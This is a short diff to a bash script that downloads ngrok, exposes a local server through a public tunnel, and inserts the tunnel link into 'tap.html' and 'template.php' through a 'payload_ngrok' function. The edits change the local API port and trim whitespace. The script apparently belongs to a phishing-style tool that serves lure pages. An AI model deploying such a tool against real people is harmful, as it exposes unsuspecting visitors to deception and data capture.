@@ -110,7 +110,7 @@ printf '\e[1;96m[\e[0m\e[1;91m+\e[0m\e[1;96m] Direct link:\e[0m\e[1;92m %s\n' $s
 
 payload_ngrok() {
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:9090/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$link'+g' tap.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
@@ -140,7 +140,7 @@ exit 1
 fi
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -159,7 +159,7 @@ printf "\e[1;96m[\e[0m+\e[1;96m] Starting ngrok server...\n"
 ./ngrok http 8888 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:9090/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;96m[\e[0m*\e[1;96m] Direct link:\e[0m\e[1;91m %s\e[0m\n" $link
 
 payload_ngrok
